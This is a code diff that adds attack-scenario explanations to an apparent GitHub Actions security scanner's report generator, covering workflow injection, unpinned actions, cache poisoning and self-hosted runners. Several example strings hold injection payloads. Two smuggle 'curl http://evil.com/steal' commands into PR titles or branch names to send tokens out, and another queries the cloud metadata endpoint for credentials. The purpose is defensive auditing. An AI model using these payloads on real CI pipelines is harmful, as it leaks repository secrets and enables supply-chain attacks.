@@ -234,6 +234,199 @@ async def run(input_dict, tools):
         lines.append(f"| Top ecosystems | {eco_summary} |")
         lines.append("")
 
+        # --- Findings by Vulnerability Type ---
+        check_counts = sec_stats.get("check_counts", {})
+        # Filter out informational-only checks
+        info_checks = {"composite_actions_scanned", "missing_dependency_updates"}
+        vuln_checks = {k: v for k, v in check_counts.items() if k not in info_checks and v > 0}
+
+        ATTACK_SCENARIOS = {
+            "prt_checkout": {
+                "label": "PR Target Code Execution",
+                "severity": "CRITICAL",
+                "description": "Workflow uses `pull_request_target` and checks out the PR head code.",
+                "attack": ("An external contributor opens a PR that modifies a script executed by the workflow. "
+                           "Because `pull_request_target` runs with the *base* repo's secrets and write permissions, "
+                           "the attacker's code executes with full access to repository secrets, NPM_TOKENs, "
+                           "signing keys, and can push malicious releases."),
+                "example": ("1. Attacker forks the repo\n"
+                            "2. Modifies `build.sh` to exfiltrate `$NPM_TOKEN` to an external server\n"
+                            "3. Opens PR — workflow checks out attacker's branch and runs `build.sh`\n"
+                            "4. Secrets are leaked; attacker publishes backdoored package"),
+            },
+            "composite_action_input_injection": {
+                "label": "Composite Action Hidden Injection",
+                "severity": "HIGH",
+                "description": "Composite action interpolates `inputs.*` directly in `run:` blocks.",
+                "attack": ("A workflow passes user-controlled values (PR title, branch name, label) to a composite action "
+                           "via `with:`. The composite action directly interpolates these in a shell `run:` block. "
+                           "The injection is hidden from workflow-level code review because reviewers see "
+                           "`with: { version: ${{ inputs.version }} }` — which looks safe — but inside the composite "
+                           "action, that value is used as `echo ${{ inputs.version }}` in a shell context."),
+                "example": ("1. Composite action has: `run: echo \"Building ${{ inputs.version }}\"`\n"
+                            "2. Workflow calls it with: `version: ${{ github.event.pull_request.title }}`\n"
+                            "3. Attacker sets PR title to: `\"; curl http://evil.com/steal?t=$NPM_TOKEN #`\n"
+                            "4. Shell executes the injected command with workflow secrets"),
+            },
+            "run_block_injection": {
+                "label": "Workflow Script Injection",
+                "severity": "LOW–MEDIUM",
+                "description": "Direct `${{ }}` interpolation of values in workflow `run:` blocks.",
+                "attack": ("When untrusted values (PR titles, branch names, issue bodies) are interpolated directly "
+                           "into shell scripts via `${{ }}`, an attacker can inject arbitrary shell commands. "
+                           "Even trusted values like `secrets.*` or `workflow_dispatch` inputs risk log leakage "
+                           "or accidental command injection from malformed input."),
+                "example": ("1. Workflow has: `run: echo \"Branch: ${{ github.head_ref }}\"`\n"
+                            "2. Attacker creates branch named: `main\"; curl http://evil.com/steal?t=$SECRET #`\n"
+                            "3. Shell interprets the branch name as a command\n"
+                            "4. Fix: pass through `env:` block and reference as `$BRANCH`"),
+            },
+            "unpinned_actions": {
+                "label": "Unpinned Action Tags",
+                "severity": "MEDIUM",
+                "description": "Actions referenced by mutable version tags instead of SHA-pinned commits.",
+                "attack": ("An attacker compromises an action's repository (or a maintainer account) and pushes "
+                           "malicious code to an existing tag like `v4`. Every workflow referencing `actions/checkout@v4` "
+                           "immediately runs the compromised code. This happened in the real-world `tj-actions/changed-files` "
+                           "supply chain attack (March 2025)."),
+                "example": ("1. Workflow uses `actions/setup-node@v4` (mutable tag)\n"
+                            "2. Attacker compromises the action repo and force-pushes to the `v4` tag\n"
+                            "3. Next workflow run executes attacker's code with full repo access\n"
+                            "4. Fix: pin to SHA — `actions/setup-node@1a4442cacd436585916f`"),
+            },
+            "composite_action_unpinned": {
+                "label": "Unpinned Actions in Composite Actions",
+                "severity": "MEDIUM",
+                "description": "Composite actions reference other actions by mutable tags.",
+                "attack": ("Same supply chain risk as unpinned workflow actions, but harder to audit. "
+                           "Reviewers checking `.github/workflows/` won't see the unpinned refs buried "
+                           "inside `.github/actions/*/action.yml`. A compromised dependency action affects "
+                           "all workflows that call the composite action."),
+                "example": ("1. Composite action `.github/actions/build/action.yml` uses `actions/cache@v4`\n"
+                            "2. 15 workflows call this composite action\n"
+                            "3. `actions/cache@v4` tag is compromised\n"
+                            "4. All 15 workflows are now executing malicious code"),
+            },
+            "composite_action_injection": {
+                "label": "Composite Action Input Interpolation",
+                "severity": "LOW",
+                "description": "Composite action interpolates inputs in `run:` blocks (trusted callers today).",
+                "attack": ("Currently called only from trusted contexts (workflow_dispatch, push to main), "
+                           "but if a future workflow passes untrusted input (PR title, comment body) to this "
+                           "composite action, the interpolation becomes exploitable. The injection surface "
+                           "is pre-positioned — it just needs an unsafe caller."),
+                "example": ("1. Composite action has: `run: ./build.sh --version=${{ inputs.version }}`\n"
+                            "2. Today, only called from workflow_dispatch (committers only) — safe\n"
+                            "3. Future PR adds: `version: ${{ github.event.pull_request.head.ref }}`\n"
+                            "4. Now attacker-controlled input flows into shell execution"),
+            },
+            "broad_permissions": {
+                "label": "Overly Broad Token Permissions",
+                "severity": "LOW",
+                "description": "Workflow requests more GITHUB_TOKEN scopes than needed.",
+                "attack": ("A workflow with `contents: write`, `issues: write`, and `pull-requests: write` "
+                           "gives any compromised step (via unpinned action or injection) the ability to "
+                           "push code, close issues, merge PRs, and modify releases. Least-privilege would "
+                           "limit blast radius."),
+                "example": ("1. Workflow has `permissions: { contents: write, issues: write }`\n"
+                            "2. A third-party action in the workflow is compromised\n"
+                            "3. Compromised action uses GITHUB_TOKEN to push a backdoor commit\n"
+                            "4. Fix: restrict to only needed scopes per job"),
+            },
+            "cache_poisoning": {
+                "label": "Cache Poisoning via PR",
+                "severity": "INFO",
+                "description": "Workflow uses `actions/cache` with pull_request trigger.",
+                "attack": ("An attacker's PR can populate the GitHub Actions cache with malicious build "
+                           "artifacts or dependencies. If the cache key is predictable (e.g., based on "
+                           "`hashFiles('**/package-lock.json')`), subsequent runs on the main branch "
+                           "may restore the poisoned cache."),
+                "example": ("1. Workflow caches `node_modules` on PR events\n"
+                            "2. Attacker's PR modifies `package-lock.json` to add a malicious package\n"
+                            "3. Cache is populated with attacker's dependencies\n"
+                            "4. Next main-branch build restores the poisoned cache"),
+            },
+            "missing_codeowners": {
+                "label": "No CODEOWNERS File",
+                "severity": "LOW",
+                "description": "Repository has no CODEOWNERS file for workflow change review.",
+                "attack": ("Without CODEOWNERS requiring security team review of `.github/` changes, "
+                           "any committer can modify workflow files, add new triggers, weaken permissions, "
+                           "or introduce injection patterns without mandatory security review."),
+                "example": ("1. Committer adds `pull_request_target` trigger to an existing workflow\n"
+                            "2. No CODEOWNERS rule requires security review for `.github/` changes\n"
+                            "3. PR is merged with standard code review (reviewer may miss security implication)\n"
+                            "4. Workflow is now vulnerable to external PRs"),
+            },
+            "codeowners_gap": {
+                "label": "CODEOWNERS Missing .github/ Coverage",
+                "severity": "LOW",
+                "description": "CODEOWNERS exists but has no rule covering `.github/` directory.",
+                "attack": ("Same risk as missing CODEOWNERS but more subtle — the repo has CODEOWNERS for source "
+                           "code but forgot to add `.github/` coverage. Security team reviews code changes "
+                           "but workflow modifications slip through."),
+                "example": ("1. CODEOWNERS has: `*.java @security-team` but no `.github/` rule\n"
+                            "2. Committer modifies `.github/workflows/release.yml`\n"
+                            "3. Change bypasses security team review\n"
+                            "4. Fix: add `/.github/ @security-team` to CODEOWNERS"),
+            },
+            "third_party_actions": {
+                "label": "Third-Party Actions",
+                "severity": "INFO",
+                "description": "Workflow uses actions from outside the `actions/` and `github/` organizations.",
+                "attack": ("Third-party actions run with full access to the workflow's GITHUB_TOKEN and secrets. "
+                           "A compromised maintainer account, repo transfer, or typosquat can turn a "
+                           "trusted action into a supply chain attack vector."),
+                "example": ("1. Workflow uses `cool-org/deploy-action@v2`\n"
+                            "2. `cool-org` maintainer's GitHub account is compromised\n"
+                            "3. Attacker pushes malicious code to the `v2` tag\n"
+                            "4. Every repo using this action now leaks secrets on next run"),
+            },
+            "self_hosted_runner": {
+                "label": "Self-Hosted Runner Exposure",
+                "severity": "MEDIUM",
+                "description": "Workflow runs on self-hosted runners with PR triggers.",
+                "attack": ("Self-hosted runners persist state between jobs. An attacker's PR can execute "
+                           "arbitrary code on the runner, install backdoors, steal credentials cached on disk, "
+                           "or pivot to internal networks the runner has access to."),
+                "example": ("1. Workflow runs on `self-hosted` runner and triggers on `pull_request`\n"
+                            "2. Attacker's PR executes: `curl http://169.254.169.254/latest/meta-data/`\n"
+                            "3. AWS instance credentials are exfiltrated\n"
+                            "4. Attacker gains access to internal infrastructure"),
+            },
+        }
+
+        if vuln_checks:
+            lines.append("## Findings by Vulnerability Type\n")
+            lines.append("| Vulnerability | Count | Severity | Description |")
+            lines.append("|--------------|-------|----------|-------------|")
+
+            for check, count in sorted(vuln_checks.items(), key=lambda x: -x[1]):
+                scenario = ATTACK_SCENARIOS.get(check, {})
+                label = scenario.get("label", check)
+                sev_label = scenario.get("severity", "—")
+                desc = scenario.get("description", "")
+                lines.append(f"| [{label}](#{anchor(label)}) | {count} | {sev_label} | {desc} |")
+
+            lines.append("")
+
+            # --- Attack Scenario Details ---
+            lines.append("## Attack Scenarios\n")
+            lines.append("For each vulnerability type found, here is how an attacker could exploit it.\n")
+
+            for check, count in sorted(vuln_checks.items(), key=lambda x: -x[1]):
+                scenario = ATTACK_SCENARIOS.get(check)
+                if not scenario:
+                    continue
+                label = scenario["label"]
+                lines.append(f"### {label}\n")
+                lines.append(f"**{count} instances found** | Severity: **{scenario['severity']}**\n")
+                lines.append(f"{scenario['attack']}\n")
+                lines.append(f"**Example attack:**\n")
+                for step in scenario["example"].split("\n"):
+                    lines.append(step)
+                lines.append("")
+
         # --- CRITICAL + HIGH publishing tier ---
         immediate = critical_repos + high_publishing
         if immediate:
